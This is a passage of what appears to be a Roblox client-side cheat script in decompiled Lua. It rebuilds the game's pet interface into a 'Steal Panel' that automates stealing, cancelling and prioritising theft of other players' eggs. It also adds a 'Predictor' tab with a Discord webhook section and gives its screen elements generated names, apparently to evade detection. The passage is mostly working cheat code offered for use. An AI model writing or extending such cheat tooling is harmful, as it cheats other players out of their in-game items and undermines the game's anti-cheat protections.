					if v21.Frame.LayoutOrder ~= i then
						v21.Frame.LayoutOrder = i
					end

					fn29(v21, tbl20[v20.Uid], v20.Uid == v18, #tbl19)
				end
			end
		end

		local function fn32()
			if not v14 then
				return
			end
			local n16 = math.max(1, math.floor(v14.AbsoluteSize.X / n7 + 0.5))
			if n16 == n11 then
				return
			end
			n11 = n16

			for _, v18 in pairs(tbl12) do
				v18.Frame.Size = UDim2.new(1, 0, 0, n16)
			end
		end

		local function fn33(arg)
			local clone = v15:Clone()
			local spacer = clone:FindFirstChild("Spacer")
			local textLabel = spacer:FindFirstChild("TextLabel")

			local tbl18 = {
				Uid = arg,
				Frame = clone,
				Icon = spacer:FindFirstChild("Icon"),
				Label = textLabel,
				ValueLabel = spacer:FindFirstChild("Value"),
				DetailLabel = spacer:FindFirstChild("Detail"),
			}

			tbl18.Gradient = textLabel and textLabel:FindFirstChildOfClass("UIGradient")
			tbl18.Steal = fn20(spacer:FindFirstChild("Unequip"))
			tbl18.Cancel = fn20(spacer:FindFirstChild("Cancel"))
			tbl18.Star = fn20(spacer:FindFirstChild("Star"))
			tbl18.Up = fn20(spacer:FindFirstChild("Up"))
			tbl18.Down = fn20(spacer:FindFirstChild("Down"))
			tbl18.Badge = spacer:FindFirstChild("Rank")
			tbl18.BadgeGradient = tbl18.Badge and tbl18.Badge:FindFirstChildOfClass("UIGradient") or nil

			if textLabel and not tbl18.Gradient then
				tbl18.Gradient = Instance.new("UIGradient")
				tbl18.Gradient.Parent = textLabel
			end

			fn22(tbl18.Steal)
			fn22(tbl18.Cancel)
			fn22(tbl18.Star)
			fn22(tbl18.Up)
			fn22(tbl18.Down)

			for _, v18 in ipairs({ { tbl18.Up, -1 }, { tbl18.Down, 1 } }) do
				if v18[1] then
					v18[1].Button.Activated:Connect(function()
						if type(tbl4.MoveInPlan) == "function" then
							tbl4.MoveInPlan(tbl18.Uid, v18[2])
						end

						tbl4.UiDefer(fn31)
					end)
				end
			end

			if tbl18.Steal then
				tbl18.Steal.Button.Activated:Connect(function()
					if tbl18.Rank == nil and type(tbl4.StealNow) == "function" then
						tbl4.StealNow(tbl18.Uid, false)
					end

					tbl4.UiDefer(fn31)
				end)
			end

			if tbl18.Cancel then
				tbl18.Cancel.Button.Activated:Connect(function()
					tbl16[tbl18.Uid] = os.clock() + n15

					if type(tbl4.CancelSteal) == "function" then
						tbl4.CancelSteal(tbl18.Uid)
					end

					tbl4.UiDefer(fn31)
				end)
			end

			if tbl18.Star then
				tbl18.Star.Button.Activated:Connect(function()
					if type(tbl4.PrioritizeSteal) == "function" then
						tbl4.PrioritizeSteal(tbl18.Uid)
					end

					tbl4.UiDefer(fn31)
				end)
			end

			fn17(clone, true)
			fn16(clone)
			clone.Size = UDim2.new(1, 0, 0, math.max(n11, 1))
			clone.Visible = true
			clone.Parent = v14
			return tbl18
		end

		local function fn34(arg, arg2)
			local style = arg2.Style

			if arg.Category ~= arg2.Category then
				arg.Category = arg2.Category

				if arg.Icon then
					arg.Icon.Image = style.Icon
				end

				if arg.Gradient then
					arg.Gradient.Color = style.GradientColor
					arg.Gradient.Rotation = style.GradientRotation
				end
			end

			fn12(arg.Label, style.Name)
			fn12(arg.ValueLabel, fn11(arg2.Value))
			fn12(arg.DetailLabel, arg2.Detail or "")
		end

		local function fn35(arg)
			local n16 = tonumber(arg) or 0
			local str = n16 >= 1000 and string.format("%.0f", n16) or string.format("%.2f", n16)
			local v18, v19 = string.match(str, "^(%-?%d+)(%.%d+)$")
			v18 = v18 or str
			local v20

			while true do
				local v21
				v20, v21 = string.gsub(v18, "^(%-?%d+)(%d%d%d)", "%1,%2")

				if v21 ~= 0 then
					v18 = v20
				else
					break
				end
			end

			return v20 .. (v19 or "") .. " Kg"
		end

		local function fn36(arg, arg2)
			local str = string.format("x%.2f", arg2)
			local eggRecords = tbl.EggRecords
			local flag8 = type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function"
			local n16 = 0

			if flag8 then
				local ok, result = pcall(eggRecords.WeightKgForScale, arg, arg2)

				if ok and tonumber(result) then
					n16 = tonumber(result)
					str ..= "  " .. utf8.char(183) .. "  " .. fn35(result)
				end
			end

			return str, n16
		end

		local fn37 = nil

		local function fn38(arg)
			local v18 = fn24()

			if v18 and arg == n10 and flag then
				local tbl18 = {}
				local now = os.clock()
				local n16 = -1
				local v19 = nil

				for _, v20 in pairs(v18) do
					local uid = type(v20) == "table" and v20.Uid or nil
					local flag8 = v20.State == "Slot" or v20.State == "Dropped" or v20.State == "Carried"

					if type(uid) == "string" and flag8 and type(v20.AssetCategory) == "string" then
						tbl18[uid] = true
						local v21 = fn9(v20.AssetCategory)
						local tbl19 = tbl13[uid]

						if not tbl19 then
							tbl19 = { Uid = uid }
							tbl13[uid] = tbl19
						end

						local scale = tonumber(v20.AssetScale) or 1

						if tbl19.Detail == nil or tbl19.Scale ~= scale or tbl19.Category ~= v20.AssetCategory then
							tbl19.Scale = scale
							local v22, v23 = fn36(v20.AssetCategory, scale)
							tbl19.Detail = v22
							tbl19.Weight = v23
						end

						tbl19.Category = v20.AssetCategory
						tbl19.Style = v21
						tbl19.Value = fn10(v20, v21)
						tbl19.Position = typeof(v20.BottomCFrame) == "CFrame" and v20.BottomCFrame.Position or nil

						if (v20.State == "Slot" or v20.State == "Dropped") and v21.Icon ~= "" and tbl19.Value > n16 then
							n16 = tbl19.Value
							v19 = tbl19
						end

						if flag3 and v14 then
							local v22 = tbl12[uid]

							if not v22 then
								v22 = fn33(uid)
								tbl12[uid] = v22
							end

							fn34(v22, tbl19)
						end
					end

					if not (n2 < os.clock() - now) then
						continue
					end
					RunService.Heartbeat:Wait()
					now = os.clock()
					if arg ~= n10 or not flag then
						return
					end
				end

				for k in pairs(tbl13) do
					if not tbl18[k] then
						tbl13[k] = nil
						local v20 = tbl12[k]

						if v20 then
							tbl12[k] = nil
							v20.Frame:Destroy()
						end
					end
				end

				if imageLabel and v19 and imageLabel.Image ~= v19.Style.Icon then
					imageLabel.Image = v19.Style.Icon
				end

				fn31()
			end
		end

		local n16 = 0

		local function fn39(arg)
			if flag6 and os.clock() - n16 < 10 then
				flag7 = true
				return
			end
			flag6 = true
			n16 = os.clock()
			pcall(fn38, arg)

			if n16 == n16 then
				flag6 = false
			end

			if flag7 then
				flag7 = false
				fn37()
			end
		end

		fn37 = function()
			local v18 = flag5
			local flag8

			if flag5 then
				flag8 = v18
			else
				flag8 = not flag
			end

			if flag8 then
				return
			end
			flag5 = true
			local v19 = n10

			task.delay(flag3 and 0.15 or 1, function()
				flag5 = false

				if flag and v19 == n10 then
					task.spawn(pcall, fn39, v19)
				end
			end)
		end

		local function fn40(arg)
			if flag3 or not v12 then
				return
			end
			flag3 = true

			if arg then
				v16:Set(true)
			end

			if fn26() then
				RunService.Heartbeat:Wait()
				if not flag3 or not v12 then
					return
				end
			end

			fn27(true)
			v11.Enabled = true

			if tween then
				tween:Cancel()
			end

			local scale = position.Y.Scale
			local offset = position.Y.Offset
			v12.Position = UDim2.new(position.X.Scale, math.ceil(v12.AbsoluteSize.X * n8), scale, offset)
			tween = TweenService:Create(v12, tweenInfo, { Position = position })
			tween:Play()
			fn19()
			fn32()
			task.spawn(pcall, fn39, n10)
		end

		local function fn41(arg, arg2)
			if not flag3 or not v12 then
				return
			end
			flag3 = false

			if arg2 then
				v16:Set(false)
			end

			if tween then
				tween:Cancel()
			end

			local scale = position.Y.Scale
			local offset = position.Y.Offset
			local tween3 = TweenService:Create(v12, tweenInfo2, { Position = UDim2.new(position.X.Scale, math.ceil(v12.AbsoluteSize.X * n8), scale, offset) })
			tween = tween3

			tween3.Completed:Connect(function(playbackState)
				if playbackState == Enum.PlaybackState.Completed and tween == tween3 and not flag3 and v11 then
					v11.Enabled = false
					v12.Position = position
				end
			end)

			tween3:Play()

			if arg then
				fn27(false)
			end
		end

		local function createScreenGui(arg)
			local screenGui = Instance.new("ScreenGui")
			screenGui.Name = fn3()
			screenGui.Archivable = false
			screenGui.ResetOnSpawn = false
			screenGui.IgnoreGuiInset = arg.IgnoreGuiInset
			screenGui.ZIndexBehavior = arg.ZIndexBehavior
			screenGui.DisplayOrder = arg.DisplayOrder

			pcall(function()
				screenGui.ScreenInsets = arg.ScreenInsets
			end)

			return screenGui
		end

		local function fn42()
			if v9 and v9.Parent and v10 and v10.Button then
				return true
			end
			local v18 = fn15(v8.Pets)
			if not v18 then
				return false
			end

			for _, v19 in ipairs({ "Notification", "ReadyNotification", "NightImage", "NightText", "ConsoleButton", "Badge" }) do
				local v20 = v18:FindFirstChild(v19)

				if v20 then
					v20:Destroy()
				end
			end

			v10 = fn20(v18)
			imageLabel = v18:FindFirstChild("ImageLabel")

			if v10.Scale then
				v10.Scale.Scale = 1
			end

			fn21(v10, tbl8.Chilli)
			fn22(v10)
			fn23(v10)
			v18.AnchorPoint = Vector2.new(0.5, 0.5)
			v18.LayoutOrder = 0

			v18.Activated:Connect(function()
				tbl4.UiDefer(function()
					if not v11 or not v11.Parent then
						pcall(fn13)

						tbl4.UiDefer(function()
							if v11 and not flag3 then
								pcall(fn40, true)
							end
						end)

						return
					end

					if flag3 then
						fn41(true, true)
					else
						fn40(true)
					end
				end)
			end)

			fn17(v18)
			fn16(v18)
			v9 = createScreenGui(v8.Hud)
			v18.Parent = v9
			v9.Parent = v3
			return true
		end

		local v18 = nil
		local v19 = nil

		local function fn43()
			local button = v10 and v10.Button
			local eggs = v8.Eggs
			local pets = v8.Pets
			if not button or not eggs.Parent or not pets.Parent then
				return
			end

			if v8.Hud.Enabled and v8.GameHud.Visible and v8.Column.Visible and eggs.Visible and pets.Visible and eggs.AbsoluteSize.X > 0 then
				local uiScale = eggs:FindFirstChildOfClass("UIScale")
				uiScale = uiScale and uiScale.Scale or 1

				if uiScale <= 0 then
					uiScale = 1
				end

				local n17 = eggs.AbsolutePosition + eggs.AbsoluteSize / 2
				local n18 = eggs.AbsoluteSize / uiScale
				local absolutePosition = v9.AbsolutePosition
				local udim24 = UDim2.fromOffset(n17.X - absolutePosition.X, n17.Y - (pets.AbsolutePosition + pets.AbsoluteSize / 2).Y - n17.Y - absolutePosition.Y)
				local udim25 = UDim2.fromOffset(n18.X, n18.Y)

				if not flag3 then
					v18 = udim24
					v19 = udim25
				end

				if button.Position ~= udim24 then
					button.Position = udim24
				end

				if button.Size ~= udim25 then
					button.Size = udim25
					fn18()
				end
			elseif not flag3 and v18 then
				if button.Position ~= v18 then
					button.Position = v18
				end

				if v19 and button.Size ~= v19 then
					button.Size = v19
					fn18()
				end
			end

			if button.Visible ~= true then
				button.Visible = true
			end
		end

		local function fn44()
			local frame = v8.ActivePets.Frame
			local v20 = fn15(frame)
			if not v20 then
				return false
			end
			local header = v20:FindFirstChild("Header")
			local scrollingFrame = v20:FindFirstChild("ScrollingFrame")
			local close = v20:FindFirstChild("Close")
			local template = scrollingFrame and scrollingFrame:FindFirstChild("Template")
			local spacer = template and template:FindFirstChild("Spacer")
			local unequip = spacer and spacer:FindFirstChild("Unequip")
			local textLabel = spacer and spacer:FindFirstChild("TextLabel")
			if not (header and scrollingFrame and close and spacer and unequip and textLabel) then
				v20:Destroy()
				return false
			end

			for _, child in ipairs(scrollingFrame:GetChildren()) do
				if child ~= template and child:IsA("GuiObject") and child.Name ~= "EmptyLast" then
					child:Destroy()
				end
			end

			local equipBest = v20:FindFirstChild("EquipBest")

			if equipBest then
				equipBest:Destroy()
			end

			local uiAspectRatioConstraint = v20:FindFirstChildOfClass("UIAspectRatioConstraint")
			local aspectRatio = uiAspectRatioConstraint and uiAspectRatioConstraint.AspectRatio or 1.25
			local flag8 = not UserInputService.MouseEnabled
			local n17 = flag8 and 1.2 or 1
			local n18 = flag8 and 1.15 or 1
			local aspectRatio2 = n6 / n18
			local n19 = aspectRatio2 / aspectRatio
			tbl11 = { Width = frame.Size.X.Scale, Height = frame.Size.Y.Scale, Aspect = aspectRatio }
			v20.Size = UDim2.new(n4 * n17, 0, n5 * n17 * n18, 0)

			if not uiAspectRatioConstraint then
				uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.Parent = v20
			end

			uiAspectRatioConstraint.AspectRatio = aspectRatio2
			uiAspectRatioConstraint.AspectType = Enum.AspectType.FitWithinMaxSize
			header.Size = UDim2.new(header.Size.X.Scale, header.Size.X.Offset, header.Size.Y.Scale * n19, header.Size.Y.Offset)
			header.Position = UDim2.new(header.Position.X.Scale, header.Position.X.Offset, header.Position.Y.Scale * n19, header.Position.Y.Offset)
			close.Size = UDim2.new(close.Size.X.Scale * 1, close.Size.X.Offset, close.Size.Y.Scale * n19, close.Size.Y.Offset)
			close.Position = UDim2.new(close.Position.X.Scale * 1, close.Position.X.Offset, close.Position.Y.Scale, close.Position.Y.Offset)
			local scale = scrollingFrame.Size.Y.Scale
			local scale2 = scrollingFrame.Position.Y.Scale
			local y = scrollingFrame.AnchorPoint.Y
			local n20 = (scale2 - scale * y) * n19
			local n21 = 1 - (1 - scale2 + scale * (1 - y)) * n19
			scrollingFrame.Size = UDim2.new(scrollingFrame.Size.X.Scale, scrollingFrame.Size.X.Offset, n21 - n20, 0)
			scrollingFrame.Position = UDim2.new(scrollingFrame.Position.X.Scale, scrollingFrame.Position.X.Offset, n20 + (n21 - n20) * y, 0)
			local scale3 = scrollingFrame.Size.Y.Scale
			local y2 = scrollingFrame.AnchorPoint.Y
			local n22 = scrollingFrame.Position.Y.Scale - scale3 * y2
			local n23 = n22 + scale3
			local n24 = 0.1 * n19
			local n25 = 0.02 * n19
			local frame2 = Instance.new("Frame")
			frame2.BackgroundTransparency = 1
			frame2.BorderSizePixel = 0
			frame2.AnchorPoint = Vector2.new(0.5, 0)
			frame2.Position = UDim2.new(0.5, 0, n22 + n25, 0)
			frame2.Size = UDim2.new(0.9, 0, n24, 0)
			frame2.Parent = v20
			local n26 = n22 + n25 * 1.5 + n24
			scrollingFrame.Size = UDim2.new(scrollingFrame.Size.X.Scale, scrollingFrame.Size.X.Offset, n23 - n26, 0)
			scrollingFrame.Position = UDim2.new(scrollingFrame.Position.X.Scale, scrollingFrame.Position.X.Offset, n26 + (n23 - n26) * y2, 0)
			local clone = unequip:Clone()
			clone.AnchorPoint = Vector2.new(0, 0.5)
			clone.Position = UDim2.new(0, 0, 0.5, 0)
			clone.Size = UDim2.new(0.37, 0, 1, 0)
			clone.Parent = frame2
			local v21 = fn20(clone)
			fn22(v21)

			clone.Activated:Connect(function()
				local v22 = v5
				local flag9 = v5

				if v22 then
					flag9 = type(v22.Set) == "function"
				end

				if flag9 then
					pcall(v22.Set, v22, not tbl4.Toggle(v22, false))
				end

				tbl4.UiDefer(fn30)
			end)

			local uiListLayout = Instance.new("UIListLayout")
			uiListLayout.FillDirection = Enum.FillDirection.Horizontal
			uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
			uiListLayout.Parent = frame2
			clone.Size = UDim2.new(0.6, 0, 1, 0)
			tbl10 = { Toggle = v21 }
			local uiGradient = header:FindFirstChildOfClass("UIGradient")

			if uiGradient then
				local v22 = fn8
				local tbl18 = {}
				local tbl19 = { 0, color2(200, 18, 24) }
				local tbl20 = { 0.53, color2(255, 88, 90) }
				local tbl21 = { 1, color2(214, 28, 34) }
				tbl18[1] = tbl19
				tbl18[2] = tbl20
				tbl18[3] = tbl21
				uiGradient.Color = v22(tbl18)
			end

			title = header:FindFirstChild("Title")
			fn12(title, "Steal Panel")
			local plusEquip = header:FindFirstChild("PlusEquip")
			v13 = fn20(plusEquip)

			if v13 then
				fn21(v13, tbl8.Steal)
				fn12(v13.Label, "Sort: " .. tostring(v4))
				fn22(v13)
				local n27 = 0

				local function fn45()
					if os.clock() - n27 < 0.25 then
						return
					end
					n27 = os.clock()
					local v22 = tbl5[(table.find(tbl5, v4) or 4) % #tbl5 + 1]
					local priorityHandle = tbl4.Steal.PriorityHandle

					if priorityHandle and type(priorityHandle.Set) == "function" then
						pcall(priorityHandle.Set, priorityHandle, v22)
					end

					if v4 ~= v22 then
						v4 = v22

						if type(tbl4.ResortSteal) == "function" then
							tbl4.ResortSteal()
						end
					end

					tbl4.UiDefer(function()
						fn12(v13.Label, "Sort: " .. tostring(v4))
						fn31()
					end)
				end

				pcall(function()
					plusEquip.Active = true
					plusEquip.Interactable = true
					plusEquip.AutoButtonColor = true
				end)

				for _, descendant in ipairs(plusEquip:GetDescendants()) do
					if descendant:IsA("GuiObject") then
						pcall(function()
							descendant.Active = false
						end)
					end
				end

				plusEquip.Activated:Connect(fn45)

				plusEquip.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
						fn45()
					end
				end)
			end

			local v22 = fn20(close)
			fn22(v22)

			close.Activated:Connect(function()
				tbl4.UiDefer(function()
					fn41(true, true)
				end)
			end)

			local clone2 = unequip:Clone()
			clone2.Name = "Cancel"
			clone2.Parent = spacer
			local uiAspectRatioConstraint2 = Instance.new("UIAspectRatioConstraint")
			uiAspectRatioConstraint2.AspectRatio = 1
			uiAspectRatioConstraint2.DominantAxis = Enum.DominantAxis.Height
			uiAspectRatioConstraint2.Parent = clone2
			unequip.Size = UDim2.new(0.24, 0, unequip.Size.Y.Scale, 0)
			unequip.Position = UDim2.new(0.852, 0, 0.5, 0)
			clone2.Size = UDim2.new(0.105, 0, unequip.Size.Y.Scale, 0)
			clone2.Position = UDim2.new(0.965, 0, 0.5, 0)
			local icon = spacer:FindFirstChild("Icon")

			if icon then
				icon.AnchorPoint = Vector2.new(0.5, 0.5)
				icon.Size = UDim2.new(0.2, 0, 1.3, 0)
				icon.Position = UDim2.new(0.1, 0, 0.5, 0)
			end

			textLabel.AnchorPoint = Vector2.new(textLabel.AnchorPoint.X, 0.5)
			textLabel.Size = UDim2.new(0.38, 0, 0.3, 0)
			textLabel.Position = UDim2.new(0.415, 0, 0.2, 0)
			fn12(textLabel, "")
			local clone3 = textLabel:Clone()
			clone3.Name = "Value"
			clone3.Size = UDim2.new(0.38, 0, 0.23, 0)
			clone3.Position = UDim2.new(0.415, 0, 0.48, 0)
			local uiGradient2 = clone3:FindFirstChildOfClass("UIGradient")

			if not uiGradient2 then
				uiGradient2 = Instance.new("UIGradient")
				uiGradient2.Parent = clone3
			end

			uiGradient2.Color = tbl8.Steal.Color
			uiGradient2.Rotation = tbl8.Steal.Rotation
			clone3.Parent = spacer
			local clone4 = clone3:Clone()
			clone4.Name = "Detail"
			clone4.Size = UDim2.new(0.4, 0, 0.3, 0)
			clone4.Position = UDim2.new(0.415, 0, 0.78, 0)
			local uiGradient3 = clone4:FindFirstChildOfClass("UIGradient")

			if uiGradient3 then
				uiGradient3.Color = tbl8.Hud.Color
				uiGradient3.Rotation = tbl8.Hud.Rotation
			end

			clone4.Parent = spacer
			local v23 = fn20(unequip)
			fn12(v23.Label, "Steal")
			fn21(v23, tbl8.Steal)
			local v24 = fn20(clone2)
			fn12(v24.Label, "X")
			fn21(v24, tbl8.Cancel)
			clone2.Position = udim2
			clone2.Visible = false
			unequip.Position = udim22
			unequip.Size = udim23
			local clone5 = clone2:Clone()
			clone5.Name = "Star"
			clone5.AnchorPoint = Vector2.new(1, 0.5)
			clone5.Size = UDim2.new(0.1, 0, 0.56, 0)
			clone5.Position = udim2
			clone5.Visible = true
			clone5.Parent = spacer
			local v25 = fn20(clone5)
			fn12(v25.Label, utf8.char(9733))
			fn21(v25, tbl8.Queued)
			local v26 = ipairs
			local tbl18 = {}
			local tbl19 = {}
			local v27 = utf8.char(9650)
			local n27 = n14 - n13
			tbl19[1] = "Up"
			tbl19[2] = v27
			tbl19[3] = n27
			local tbl20 = {}
			local v28 = utf8.char(9660)
			tbl20[1] = "Down"
			tbl20[2] = v28
			tbl20[3] = n14
			tbl18[1] = tbl19
			tbl18[2] = tbl20

			for _, v29 in v26(tbl18) do
				local clone6 = clone2:Clone()
				clone6.Name = v29[1]
				clone6.AnchorPoint = Vector2.new(1, 0.5)
				clone6.Size = UDim2.new(0.1, 0, 0.56, 0)
				clone6.Position = UDim2.new(v29[3], 0, 0.6, 0)
				clone6.Visible = false
				clone6.Parent = spacer
				local v30 = fn20(clone6)
				fn12(v30.Label, v29[2])
				fn21(v30, tbl8.Hud)
			end

			clone2.AnchorPoint = Vector2.new(1, 0)
			clone2.Position = UDim2.new(0.99, 0, 0.04, 0)
			clone2.Size = UDim2.new(0.06, 0, 0.28, 0)
			clone2.ZIndex = 8

			for _, descendant in ipairs(clone2:GetDescendants()) do
				if descendant:IsA("GuiObject") then
					descendant.ZIndex = descendant.ZIndex + 8
				end
			end

			local clone6 = clone3:Clone()
			clone6.Name = "Rank"
			clone6.AnchorPoint = Vector2.new(0, 0)
			clone6.Position = UDim2.new(0.012, 0, 0.03, 0)
			clone6.Size = UDim2.new(0.1, 0, 0.36, 0)
			clone6.TextXAlignment = Enum.TextXAlignment.Left
			clone6.ZIndex = 6
			clone6.Visible = false
			fn12(clone6, "#1")
			local uiGradient4 = clone6:FindFirstChildOfClass("UIGradient")

			if uiGradient4 then
				uiGradient4.Color = tbl8.PriorityOn.Color
				uiGradient4.Rotation = 90
			end

			clone6.Parent = spacer
			template.Visible = false
			template.Parent = nil
			v15 = template
			v14 = scrollingFrame
			v12 = v20
			position = frame.Position
			v20.Position = position
			fn17(v20, true)
			fn16(v20)
			v11 = createScreenGui(v8.ActivePets)
			v11.Enabled = false
			v20.Parent = v11
			v11.Parent = v3
			table.insert(tbl14, scrollingFrame:GetPropertyChangedSignal("AbsoluteSize"):Connect(fn32))
			table.insert(tbl14, v20:GetPropertyChangedSignal("AbsoluteSize"):Connect(fn19))
			return true
		end

		local function fn45()
			if not flag then
				return
			end
			flag = false
			n10 += 1
			flag5 = false
			flag7 = false

			if flag3 then
				flag3 = false

				if not fn25() then
					fn27(false, true)
				end
			end

			if tween then
				tween:Cancel()
				tween = nil
			end

			tbl6.DisconnectAll(tbl14)
			table.clear(tbl12)
			table.clear(tbl13)

			if v11 then
				v11:Destroy()
			end

			if v15 then
				v15:Destroy()
			end

			v11 = nil
			v12 = nil
			position = nil
			title = nil
			v13 = nil
			v14 = nil
			v15 = nil
			n11 = 0
			tbl10 = nil
			tbl11 = nil
			n12 = 1
			v8 = nil
		end

		fn13 = function()
			if flag then
				return
			end
			local v20 = fn14()

			if not v20 then
				if not flag2 then
					flag2 = true

					task.delay(2, function()
						flag2 = false

						if not flag and tbl4.Toggle(nil, true) then
							fn13()
						end
					end)
				end

				return
			end

			v8 = v20
			flag = true
			n10 += 1
			local v21 = n10
			uiStroke = v8.ActivePets.Frame:FindFirstChildOfClass("UIStroke")
			thickness = uiStroke and uiStroke.Thickness or nil
			tbl15.Panel = thickness or 2.3120369911193848
			local uiStrokeClr = v8.Pets:FindFirstChild("UIStrokeClr")
			tbl15.Hud = uiStrokeClr and uiStrokeClr:IsA("UIStroke") and uiStrokeClr.Thickness or 2.3120369911193848
			if not fn42() or not fn44() then
				fn45()
				return
			end

			if flag4 then
				flag4 = false
				task.spawn(fn40)
			end

			table.insert(tbl14, RunService.RenderStepped:Connect(fn43))

			if uiStroke then
				table.insert(tbl14, uiStroke:GetPropertyChangedSignal("Thickness"):Connect(fn18))
			end

			for _, v22 in ipairs({ v8.ActivePets, v8.GrowingEggs }) do
				if v22 then
					table.insert(tbl14, v22:GetPropertyChangedSignal("Enabled"):Connect(function()
						if v22.Enabled and flag3 then
							fn41(false)
						end
					end))
				end
			end

			local eggState = tbl.EggState

			if type(eggState) == "table" then
				for _, v22 in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "FieldClaimed", "SnapshotRefreshed" }) do
					local v23 = eggState[v22]

					if type(v23) == "table" and type(v23.Connect) == "function" then
						local ok, result = pcall(v23.Connect, v23, fn37)

						if ok and result then
							table.insert(tbl14, result)
						end
					end
				end
			end

			local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")

			if areaEggSlotsClient then
				table.insert(tbl14, areaEggSlotsClient.ChildAdded:Connect(fn37))
				table.insert(tbl14, areaEggSlotsClient.ChildRemoved:Connect(fn37))
			end

			task.spawn(function()
				local n17 = 0

				while true do
					if flag and v21 == n10 then
						n17 += task.wait(0.5)

						if not (not flag or v21 ~= n10) then
							if not (v8.Eggs:IsDescendantOf(game) and v8.ActivePets:IsDescendantOf(game)) then
								task.defer(function()
									fn45()

									if tbl4.Toggle(nil, true) then
										fn13()
									end
								end)

								break
							else
								if n17 >= n then
									fn37()
									n17 = 0
								elseif flag3 then
									fn31()
								end

								continue
							end
						end
					end

					break
				end
			end)

			task.spawn(pcall, fn39, v21)
		end

		fn4(function()
			fn45()

			if v9 then
				v9:Destroy()
			end

			fn23(nil)
			v9 = nil
			v10 = nil
			imageLabel = nil
		end)

		tbl4.RestoreStealPanel = function()
			if v16:Get() ~= true then
				return
			end

			if flag and v11 and not flag3 then
				task.spawn(fn40)
			else
				flag4 = true
			end
		end
	end

	task.defer(fn13)
	local v17

	do
		local v18 = v2:CreateTab({ Name = "Predictor", SectionsExpanded = true })
		v6 = v18:CreateSection({ Name = "Discord Webhook", Expanded = false })
		v17 = v18:CreateSection({ Name = "Egg Predictor", Expanded = true })
		v7 = v18:CreateSection({ Name = "Fuse Predictor", Expanded = false })

		local function fn24(arg, arg2)
			local ok, result = pcall(Font.new, arg, arg2, Enum.FontStyle.Normal)
			return ok and result or nil
		end

		tbl7 = {
			Ready = type(v17.CreateCanvas) == "function",
			Bullet = utf8.char(8226),
			Color = {
				Text = "#FFFFFF",
				Income = "#4DFF7A",
				Clock = "#FFC24D",
				Ready = "#4DFF7A",
				Growing = "#FFC24D",
				Inventory = "#7FD8FF",
				Weight = "#CDE7FF",
				Scale = "#FFDF8A",
				Separator = "#7A8CC0",
				Hint = "#9FB8FF",
			},
			NameFont = fn24("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold),
		}

		tbl7.RarityFont = fn24("rbxassetid://12187365977", Enum.FontWeight.Bold) or fn24("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular)
		local sequence2 = tbl6.Sequence
		local tbl16 = {}
		local tbl17 = { 0, Color3.fromRGB(255, 255, 255) }
		local tbl18 = { 0.5, Color3.fromRGB(222, 238, 255) }
		local tbl19 = { 1, Color3.fromRGB(255, 255, 255) }
		tbl16[1] = tbl17
		tbl16[2] = tbl18
		tbl16[3] = tbl19
		tbl7.NameGradient = sequence2(tbl16)
		local sequence3 = tbl6.Sequence
		local tbl20 = {}
		local tbl21 = { 0, Color3.fromRGB(255, 255, 255) }
		local tbl22 = { 0.2, Color3.fromRGB(206, 212, 224) }
		local tbl23 = { 0.42, Color3.fromRGB(74, 80, 94) }
		local tbl24 = { 0.58, Color3.fromRGB(42, 46, 56) }
		local tbl25 = { 0.78, Color3.fromRGB(158, 166, 182) }
		local tbl26 = { 1, Color3.fromRGB(250, 252, 255) }
		tbl20[1] = tbl21
		tbl20[2] = tbl22
		tbl20[3] = tbl23
		tbl20[4] = tbl24
		tbl20[5] = tbl25
		tbl20[6] = tbl26
		tbl7.SecretGradient = sequence3(tbl20)
		tbl7.SecretRotation = 90

		tbl7.Paint = function(arg, arg2)
			return string.format("<font color=\"%s\">%s</font>", arg, arg2)
		end

		tbl7.Bold = function(arg)
			return "<b>" .. tostring(arg) .. "</b>"
		end

		tbl7.Escape = function(arg)
			return (string.gsub(tostring(arg), "[<>&]", { ["<"] = "&lt;", [">"] = "&gt;", ["&"] = "&amp;" }))
		end

		tbl7.Separator = function()
			return tbl7.Paint(tbl7.Color.Separator, "  " .. tbl7.Bullet .. "  ")
		end

		tbl7.FormatRate = function(arg)
			local n13 = tonumber(arg) or 0
			if n13 >= 1e12 then
				return string.format("%.2fT/s", n13 / 1e12)
			end

			if n13 >= 1e9 then
				return string.format("%.2fB/s", n13 / 1e9)
			end

			if n13 >= 1000000 then
				return string.format("%.2fM/s", n13 / 1000000)
			end

			if n13 >= 1000 then
				return string.format("%.1fK/s", n13 / 1000)
			end
			return string.format("%d/s", math.floor(n13))
		end

		tbl7.FormatWeight = function(arg)
			local n13 = tonumber(arg) or 0
			local str = n13 >= 1000 and string.format("%.0f", n13) or string.format("%.2f", n13)
			local v19, v20 = string.match(str, "^(%-?%d+)(%.%d+)$")
			local v21 = v19 or str
			local v22

			while true do
				local v23
				v22, v23 = string.gsub(v21, "^(%-?%d+)(%d%d%d)", "%1,%2")

				if v23 ~= 0 then
					v21 = v22
				else
					break
				end
			end

			return v22 .. (v20 or "") .. " Kg"
		end

		tbl7.FormatClock = function(arg)
			local n13 = math.max(0, math.floor(tonumber(arg) or 0))
			return string.format("%02dh %02dm %02ds", math.floor(n13 / 3600), math.floor(n13 % 3600 / 60), n13 % 60)
		end

		tbl7.ScaleFactor = function(arg)
			if arg > 5 then
				return (arg / 5) ^ 1.2 * 19.637875755794113
			end
			return arg ^ 1.85
		end

		tbl7.MutationMultiplier = function(arg)
			arg = type(arg) == "table" and arg or {}
			local mutations = tbl.Mutations

			if type(mutations) == "table" and type(mutations.EarningsFor) == "function" then
				local ok, result = pcall(mutations.EarningsFor, arg)
				if ok and type(result) == "number" then
					return result
				end
			end

			return 1
		end

		local tbl27 = {
			Golden = "#FFD34D",
			Silver = "#E6EEF7",
			Sakura = "#FF9ED8",
			GreatBloom = "#7CFFC4",
			Boss = "#FF7A7A",
			Monstrous = "#C08BFF",
		}

		local tbl28 = { "#FF6B6B", "#FFB36B", "#FFF06B", "#6BFF8A", "#6BC8FF", "#B96BFF" }

		tbl7.MutationText = function(arg)
			local tbl29 = {}

			if type(arg) == "table" then
				for _, v19 in ipairs(arg) do
